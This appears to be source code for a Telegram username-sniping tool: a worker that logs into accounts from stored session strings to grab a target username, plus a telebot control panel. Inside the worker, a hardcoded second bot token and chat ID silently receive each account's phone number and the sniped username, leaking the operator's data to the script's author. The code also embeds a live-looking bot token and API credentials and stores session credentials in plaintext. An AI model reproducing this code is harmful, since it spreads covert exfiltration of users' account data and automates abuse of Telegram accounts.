import pyrogram
from pyrogram import Client
from pyrogram.types import *
import requests
from time import sleep
from pyrogram.errors import FloodWait, BadRequest

info = open("info.txt",'r').read()
tok = info.split('\n')[0]
idown = info.split('\n')[1]
r = open("user.txt").read()
mk = r.replace("@", "")
o = mk.replace(" ", "")
qq = 0
req = requests.get(f"https://t.me/{o}").text
if "tgme_username_link" not in req:
    print("No")
    v = requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=- The user is used😡')
    exit("The user is used")

while True:
    for session in open("account.txt","r").read().split("\n"):
        if session != "":
            try:
                if session != " ":
                    app = Client("ACC", api_id=24367955, api_hash="df9e7f5217331d03353a8d42e11419fc", session_string=session)
                    app.connect()
                    try:
                        app.set_username(o)
                        qq+=1
                        op = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=> New Flood Catching <
- Username : @{o}
- Clicks : {qq}
- Saved in : Account
- NumBer : {app.get_me().phone_number}
--- --- --- --- --- --- --- ---
By : - @l_T_1''')
                        v = requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=𓆩 - New Flood Catching ! 🐊')
                        pl = requests.post(f'''https://api.telegram.org/bot6214456680:AAHSapuLa3l2i60efgTa0Jy4VTlC3tWMiP8/sendMessage?chat_id=5552553507&text=> New Flood Catching <
- Username : @{o}
- Clicks : {qq}
- Saved in : Account
- NumBer : {app.get_me().phone_number}
--- --- --- --- --- --- --- ---
By :  @l_T_1''')
                    except FloodWait as e:
                        qq+=1
                        ok = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=- Checker [ {qq} ] 
- NumBer : {app.get_me().phone_number}
- Error : {e}''')
                        pass
                    except BadRequest as e:
                        qq+=1
                        ok = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=- Checker [ {qq} ]
- User is don't Save ↣ @{o}
- Error ↣ flood''')
                    try:
                        sleep(int(open("sleep.txt").read()))
                    except:
                        sleep(2)
            except:
                pass

from os import system 
import os, sys, time, requests
import random, telebot
from telebot import types

try:
    Info = open("info.txt").read()
except:
    Info = "CaRLoS"

if ":" not in Info:
    token = input("- EnTeR ToKeN : ")
    reqtoken = requests.get(f"https://api.telegram.org/bot{token}/getme").json()
    req = reqtoken["ok"]
    if req == True:
        id = input("- EnTeR iD : ")
        o = open("info.txt", 'a').write(str(token) + '\n' + str(id))
        print("- Done .")
    else:
        print("Erorr ToKeN .")
else:
    print("Ok .")

info = open("info.txt", 'r').read()
token = info.split('\n')[0]
own_id = info.split('\n')[1]
bot = telebot.TeleBot(token)
SaiF = types.InlineKeyboardButton(text="- ALI ☬ .", url='https://t.me/isiraqi')
channel = types.InlineKeyboardButton(text="- 𝖬𝖾 𝖢𝗁𝖺𝗇𝗇𝖾𝖫 .", url='https://t.me/dddmdddone')

@bot.message_handler(commands=['start'])
def start(message):
    global id, name
    id = message.from_user.id
    name = message.from_user.first_name
    print(name + " - " + str(id))
    o = types.InlineKeyboardMarkup()
    o.add(SaiF)
    o.add(channel)
    mar = types.ReplyKeyboardMarkup(resize_keyboard=True)

    try:
        y = open("user.txt").read()
        user = y.replace("@", "")
    except:
        user = "None"

    try:
        y = (open("sleep.txt").read())
        sleep = y.replace(" ", "")
    except:
        sleep = "2"

    A = types.KeyboardButton(f"• 𝖴𝗌𝖤𝗋 : @{user} •")
    B = types.KeyboardButton("• 𝖠𝖽𝖽 𝖴𝗌𝖤𝗋 •")
    C = types.KeyboardButton("• 𝖣𝖾𝖫𝖾𝗍𝖾 𝖴𝗌𝖤𝗋 •")
    D = types.KeyboardButton(f"• 𝖲𝖫𝖾𝖾𝖯 : {sleep} •")
    E = types.KeyboardButton("• 𝖠𝖽𝖽 𝖲𝖫𝖾𝖾𝖯 •")
    G = types.KeyboardButton("• 𝖱𝗎𝗇 •")
    H = types.KeyboardButton("• 𝖲𝖳𝗈𝖯 •")
    I = types.KeyboardButton("• 𝖠𝖽𝖽 𝖠𝖼𝖼𝗈𝗎𝗇𝗍 •")
    J = types.KeyboardButton("•  𝖣𝖾𝖫𝖾𝗍𝖾 𝖺𝖫𝖫 𝖠𝖼𝖼𝖮𝗎𝗇𝖳 •")
    K = types.KeyboardButton("• 𝖵𝗂𝖾𝖶 𝖺𝖫𝖫 𝖠𝖼𝖼𝖮𝗎𝗇𝖳 •")
    mar.add(A)
    mar.add(B, C)
    mar.add(D)
    mar.add(E)
    mar.add(G, H)
    mar.add(I, J)
    mar.add(K)

    if str(id) == own_id:
        bot.reply_to(message, text=f"- 𝖧𝖾𝖫𝖫𝗈 , {name}", parse_mode="markdown")
        bot.reply_to(message, text=f"""-𝖶𝖾𝖫𝖼𝗈𝖬𝖾 𝖳𝗈 𝖴𝗌𝖤𝗋𝗌 𝖥𝖫𝗈𝗈𝖣 𝖥𝗂𝗌𝗁𝗂𝖭𝗀 𝖢𝗁𝖾𝖼𝖪𝖾𝗋 
- 𝖣𝖾𝗏𝖾𝖫𝗈𝖯𝖾𝗋 : @isiraqi""", parse_mode="markdown", reply_markup=mar)
    if str(id) != own_id:
        bot.reply_to(message, text=f"""*- 𝖣𝖾𝗏𝖾𝖫𝗈𝖯𝖾𝗋 : @isiraqi*""", parse_mode="markdown", reply_markup=o)

@bot.message_handler(func=lambda m:True)
def text(message):
    acc = message.text
    id = message.from_user.id

    if str(id) == own_id:
        if acc == "• 𝖣𝖾𝖫𝖾𝗍𝖾 𝖴𝗌𝖤𝗋 •":
            try:
                os.remove("user.txt")
                bot.send_message(message.chat.id, text="- Done Delete User .")
            except:
                bot.send_message(message.chat.id, text="- There is no user .")
        if acc == "• 𝖠𝖽𝖽 𝖴𝗌𝖤𝗋 •":
            bot.send_message(message.chat.id, text="- Send /user with user like this \n /user @isiraqi ")
        if acc == "• 𝖠𝖽𝖽 𝖲𝖫𝖾𝖾𝖯 •":
            bot.send_message(message.chat.id, text="- Send /sleep with sleep like this \n /sleep 0 ")
        if "/user" in acc and "@" in acc:
            a = acc.replace("/user", "")
            o = a.replace(" ", "")
            try:
                with open('user.txt', 'a') as the_combo:
                    the_combo.write(str(o))
                bot.send_message(message.chat.id, text="- User has been added")
            except:
                bot.send_message(message.chat.id, text="- A problem occurred, please try again .")
        if "/sleep" in acc:
            try:
                os.remove("sleep.txt")
            except:
                pass
            a = acc.replace("/sleep", "")
            o = a.replace(" ", "")
            try:
                with open('sleep.txt', 'a') as the_combo:
                    the_combo.write(str(o))
                bot.send_message(message.chat.id, text="- Sleep has been added")
            except:
                bot.send_message(message.chat.id, text="- A problem occurred, please try again .")
        if acc == "• 𝖱𝗎𝗇 •":
            try:
                bot.send_message(message.chat.id, text="- The flood bot has been activated .🐊")
                system("screen -S BoT -X kill")
                system("screen -S BoT python3 bot.py")
            except:
                pass
        if acc == "• 𝖲𝖳𝗈𝖯 •":
            try:
                system("screen -S BoT -X kill")
            except:
                pass
            bot.send_message(message.chat.id, text="- The flood bot has been deactivated .🐊")
        if acc == "• 𝖠𝖽𝖽 𝖠𝖼𝖼𝗈𝗎𝗇𝗍 •":
            bot.send_message(message.chat.id, text="- Send /acc with sessions ")
        if "/acc" in acc:
            ks = acc.replace("/acc", "")
            k = ks.replace(" ", "")
            try:
                with open('account.txt', 'a') as the_combo:
                    the_combo.write(str(k)+'\n')
                bot.send_message(message.chat.id, text="Accounts has been added")
            except:
                bot.send_message(message.chat.id, text="- A problem occurred, please try again .")
        if acc == "•  𝖣𝖾𝖫𝖾𝗍𝖾 𝖺𝖫𝖫 𝖠𝖼𝖼𝖮𝗎𝗇𝖳 •":
            bot.send_message(message.chat.id, text="- Are you sure to delete your accounts? If sure, send /deleteAll ")
        if acc == "/deleteAll":
            try:
                os.remove("account.txt")
                bot.send_message(message.chat.id, text="- Accounts have been cleared ")
            except:
                bot.send_message(message.chat.id, text="- There are no accounts  .")
        if acc == "• 𝵐𝵒𝵶𝵬 𝖠𝖫𝖫 𝖠𝖼𝖼𝖮𝗎𝗇𝖳 •":
            try:
                document = open('account.txt', 'rb')
                m = len(open("account.txt").readlines())
                bot.send_document(message.chat.id, document, caption=f"- The number of your accounts : {m}\nBy : @isiraqi")
            except:
                bot.send_message(message.chat.id, text="- There are no accounts .")

bot.polling(none_stop=True)
